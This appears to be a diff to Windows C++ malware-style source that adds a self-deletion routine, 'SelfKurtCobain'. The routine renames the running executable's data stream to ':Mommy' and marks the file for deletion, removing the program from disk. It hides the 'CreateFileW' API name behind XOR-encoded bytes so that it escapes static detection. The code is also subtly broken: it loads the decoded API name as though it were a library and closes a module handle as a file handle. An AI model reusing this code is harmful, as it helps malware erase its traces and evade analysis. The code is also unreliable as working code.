@@ -3,12 +3,87 @@
 #include <filesystem>
 #include <Windows.h>
 
+#define NEW_STREAM L":Mommy"
+
 void rox(BYTE* buffer, size_t bufferLength, const BYTE key)
 {
     for (int i = 0; i < bufferLength; i++)
     {
         buffer[i] ^= key;
     }
+}
+
+int SelfKurtCobain(void)
+{
+    PFILE_RENAME_INFO PFRI = NULL;
+    size_t nameLength = wcslen(NEW_STREAM) * sizeof(WCHAR);
+    size_t sizePrfi = sizeof(FILE_RENAME_INFO) + nameLength;
+    FILE_DISPOSITION_INFO FDI = { 0 };
+    WCHAR path[MAX_PATH * 2] = { 0 };
+
+    PFRI = (PFILE_RENAME_INFO)calloc(1, sizePrfi);
+
+    if (PFRI == NULL)
+    {
+        return EXIT_FAILURE;
+    }
+
+    FDI.DeleteFile = TRUE;
+
+    PFRI->FileNameLength = nameLength;
+    memcpy(PFRI->FileName, NEW_STREAM, nameLength);
+
+    if (GetModuleFileNameW(NULL, path, (MAX_PATH * 2)) == 0)
+    {
+        free(PFRI);
+        return EXIT_FAILURE;
+    }
+
+    const BYTE key = 0xFF;
+    BYTE kb[] = { 0xBC, 0x8D, 0x9A, 0x9E, 0x8B, 0x9A, 0xB9, 0x96, 0x93, 0x9A, 0xA8, 0x00 };
+    rox(kb, sizeof(kb) - 1, key);
+    HMODULE hModuleK = LoadLibraryA(reinterpret_cast<char*>(kb));
+
+    typedef HANDLE(WINAPI* Cpw)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+
+    Cpw cpaf = (Cpw)(GetProcAddress(hModuleK, reinterpret_cast<char*>(kb)));
+
+    HANDLE hFile = cpaf(path, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        free(PFRI);
+        return EXIT_FAILURE;
+    }
+
+
+    if (!SetFileInformationByHandle(hFile, FileRenameInfo, PFRI, (DWORD)sizePrfi))
+    {
+        free(PFRI);
+        CloseHandle(hFile);
+        return EXIT_FAILURE;
+    }
+
+    CloseHandle(hFile);
+
+    HANDLE hFile2 = cpaf(path, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+    if (hFile2 == INVALID_HANDLE_VALUE)
+    {
+        free(PFRI);
+        return EXIT_FAILURE;
+    }
+
+    if (!SetFileInformationByHandle(hFile2, FileDispositionInfo, &FDI, sizeof(FDI)))
+    {
+        free(PFRI);
+        CloseHandle(hFile2);
+        return EXIT_FAILURE;
+    }
+
+    CloseHandle(hFile2);
+    CloseHandle(hModuleK);
+    free(PFRI);
+
+    return EXIT_SUCCESS;
 }
 
 int Hug(const char* path)
